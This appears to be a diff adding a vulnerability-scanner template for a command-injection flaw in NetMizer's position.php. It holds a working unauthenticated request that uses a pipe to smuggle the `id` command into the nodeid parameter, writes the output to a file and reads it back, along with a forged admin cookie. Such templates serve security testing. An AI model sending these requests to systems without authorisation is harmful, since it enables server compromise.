@@ -1,0 +1,28 @@
+id: NetMizer-position-rce
+info:
+  name: Template Name
+  author: wangzong
+  severity: critical
+  description: NetMizer 日志管理系统position.php、接口处存在命令执行漏洞，未经身份验证的攻击者可通过该漏洞在服务器端任意执行命令，写入后门，获取服务器权限，进而控制整个web服务器。
+  reference:
+    - https://github.com/wudijun/Catcher/blob/d54daa732c892c197635c22fed1daa44586b0a86/poc/NetMizer%E6%97%A5%E5%BF%97%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F/NetMizer%E6%97%A5%E5%BF%97%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E5%89%8D%E5%8F%B0RCE%E6%BC%8F%E6%B4%9E.yaml#L10
+  tags: tags
+variables:
+  filename: "{{rand_base(6)}}"
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/data/search/position.php?action=file&nodeid=|id%3E{{filename}}.txt"
+      - "{{BaseURL}}//data/search/{{filename}}.txt"
+    headers:
+      Cookie: username=admin     
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: header
+        words:
+          - '200'
+      - type: word
+        part: body
+        words:
+          - 'uid='
